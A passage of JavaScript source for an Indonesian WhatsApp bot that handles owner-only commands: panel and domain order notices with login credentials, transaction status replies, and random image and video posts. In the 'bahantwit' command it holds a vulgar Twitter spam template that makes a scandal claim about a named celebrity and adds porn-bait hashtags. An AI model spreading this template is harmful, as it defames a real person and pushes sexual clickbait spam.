            m.reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
Biiofc.sendMessage(mq1, {text:`*───❖》SanZ Offcial《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m2}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal}*\n*Jam : ${jam}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Domain : ${m3}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*_Note : Tutup ( Sensor ) Domain Anda Dan Jangan Sampai Orang Lain Melihat Atau Tidak Nanti Domain Anda Bakal Kena Ddos Attack_*\n\n\n\n*© Rafathar Offcial*`}, m) 
                 }
            break
 case 'spanel': case 'sendpanel': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
		 if (!isOwner) return reply(`Ngapain ? Khusus SanZ Offcial Aja !!`)
          if (!text) return m.reply(`Example : ${prefix + command} 6285xxxxx,harga,linklog,username, password`)
            m.reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
            var m4 = mon.split(",")[3]
            var m5 = mon.split(",")[4]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya =  + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
Biiofc.sendMessage(mq1, {text:`*───❖》SanZ Offcial《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m2}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal}*\n*Jam : ${jam}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Username : ${m4}*\n*[+] Password : ${m5}*\n*[+] Login : ${m3}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*_Note : Jangan Lupa Ganti Password Agar Terhindar Dari Pencurian Akun Panel_*\n\n\n\n*© Rafathar Offcial*`}, m) 
                 }
            break
case 'bahanyt':
        id = m.key.remoteJid
        if(validGrup(id,grups)){
                bahanyt =`
https://drive.google.com/drive/mobile/folders/1wla7p1yce-F0nxJdCX2aUq_OAozTYZeK
_*BAHAN NEBAR YOUTUBE TU DECK*_`
                reply(bahanyt)


        }else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }
    break
case 'bahantwit':
id = m.key.remoteJid
        if(validGrup(id,grups)){
 bahantwit =`
*AWOKAWOK GABISA NEBAR DEK? NIH BAHAN NYA KONTOL!!!*

 _BAHAN NEBAR TWITTER_
_*©LIF4YOU X DIMAS*_
 
 HT TWITTER 

Yg lagi viral Biadab Artis Anissa Aziza
Terekam cctv  di mall selingkuh 

Scandal viral  terbaru VCS
malam sabtu bokep indo terbaru
#JanganLupaNgeDOT
#SANGE_AAAAAAAAAAH
#SANGE_AAAAAAAAAA`
reply(bahantwit)

        }else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }

break
case 'addgcweb':
            if (!isOwner && !m.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
                id = msg.key.remoteJid
                pengirim = m.key.participant
                nama = m.chat.pushName
reply('_*SUKSES BANG GRUP MU UDH BISA DI AKSES*_')          
case 'update':
        if (!isOwner && !m.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
        
            if(args == ""){
            psn = `ketik .update
            `
            reply(psn)
            }else{                
                jenis = args[0]
                isi = args[2]
            
            update= updateDatabase(jenis,isi)
            if(update == "success"){
            server = JSON.parse(fs.readFileSync('./database/server.json'))
            grups = JSON.parse(fs.readFileSync('./database/grups.json'))
            
                info = `*SUKSES OM*`
reply(info)
}                
}            
break
case 'getcase':

const getCase = (cases) => {

            return "case  "+`'${cases}'`+fs.readFileSync("./appearance.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"

        }
            try{

                if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')

                if (!q) return reply(`contoh : ${prefix + command} antilink`)

                let nana = await getCase(q)

                reply(nana)

            } catch(err){

            console.log(err)

            reply(`Case ${q} tidak di temukan`)

        }

        break
 case 'autoread':
                if (!isOwner) return reply(mess.owner)
                if (args.length < 1) return reply(`Contoh ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread = true
                    reply(`Berhasil mengubah autoread ke ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    reply(`Berhasil mengubah autoread ke ${q}`)
                }
                break      
  case 'myip':
            case 'ipbot':
                if (!isOwner) return reply(mess.owner)
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        reply("🔎 My public IP address is: " + ip);
                    })
                })
                break
  case 'randomcecan1':{
if (!isOwner) return reply(`Ngapain ? Khusus SanZ Offcial Aja !!`)
  reply(`_Tunggu Sebentar Tuan Sedang Kami Proses⏳_`)
  buffer = await getBuffer('https://c.top4top.io/m_26649xrwy1.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
        break
  case 'randomcecan2':{
if (!isOwner) return reply(`Ngapain ? Khusus SanZ Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://b.top4top.io/m_27832zh400.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
        break
  case 'randomcecan3':{
if (!isOwner) return reply(`Ngapain ? Khusus SanZ Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://g.top4top.io/m_2783uxoa40.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
        break
  case 'randomcecan4':{
if (!isOwner) return reply(`Ngapain ? Khusus SanZ Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://b.top4top.io/m_26628tg3t1.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan5':{
if (!isOwner) return reply(`Ngapain ? Khusus SanZ Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://k.top4top.io/m_26648pl8c1.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan6':{
if (!isOwner) return reply(`Ngapain ? Khusus SanZ Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://l.top4top.io/m_2662wywyl1.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan7':{
if (!isOwner) return reply(`Ngapain ? Khusus SanZ Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://h.top4top.io/m_26627pr7n1.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan8':{
if (!isOwner) return reply(`Ngapain ? Khusus SanZ Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://l.top4top.io/m_2662rdkb01.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan9':{
if (!isOwner) return reply(`Ngapain ? Khusus SanZ Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://h.top4top.io/m_2662l0ljt1.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan10':{
if (!isOwner) return reply(`Ngapain ? Khusus SanZ Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://i.top4top.io/m_26628j9e61.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
break
 case 'tiktokaudio':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
require('./freya/tiktok').Tiktok(q).then( data => {
Biiofc.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
case 'r': case 'revoke': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isBotAdmins) return reply(mess.only.badmin)
Biiofc.groupRevokeInvite(m.chat)
}
break
case 'tiktokgirl':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var asupan = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
Biiofc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var gheayubi = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
Biiofc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var bocil = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
Biiofc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var ukhty = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
Biiofc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var santuy = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
Biiofc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var kayes = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
Biiofc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var rikagusriani = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
Biiofc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknotnot':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'chinese':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/bike.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/boneka.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cat.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/doggo.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/justina.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kayes.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kpop.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/notnot.json'))
var hasil = pickRandom(notnot)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break      
case 'done':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*

Penggunaan:
${prefix + command} barang,nominal`);
let barang = t[0];
let nominal = t[1];
reply(`*━━ TRANSAKSI INFO ━━*

 _• *Barang:* ${barang}_
 _• *Nominal:* Rp${nominal}_
 _• *Tanggal:* ${tanggal}_

*TERIMA KASIH TELAH ORDER DI ${global.namaCreator}*\n*JANGAN LUPA ORDER LAGI YA*🙏`)
}
        break
case "tunda": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚* )▭▬▭


𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚
𝗛𝗔𝗥𝗔𝗣 𝗕𝗘𝗥𝗦𝗔𝗕𝗔𝗥

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "proses": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *𝗦𝗘𝗗𝗔𝗡𝗚 𝗗𝗜 𝗣𝗥𝗢𝗦𝗘𝗦* )▭▬▭


𝗛𝗮𝗿𝗮𝗽 𝗧𝘂𝗻𝗴𝗴𝘂 𝗦𝗲𝗯𝗲𝗻𝘁𝗮𝗿
𝗣𝗿𝗼𝗱𝘂𝗸 𝗦𝗲𝗱𝗮𝗻𝗴 𝗗𝗶 𝗣𝗿𝗼𝘀𝗲𝘀️

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "batal": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗔𝗧𝗔𝗟* )▭▬▭

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${tanggal}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${jam}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Batal

𝗦𝗲𝗹𝘂𝗿𝘂𝗵 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗮𝘁𝗮𝗹

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "reqvps": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *REQUEST VPS* )▭▬▭

Region : 
Os : 
Version : 
Ram : 
Ip : 
Password : 
*Garansi 15 Day*
*Create ${tanggal}*
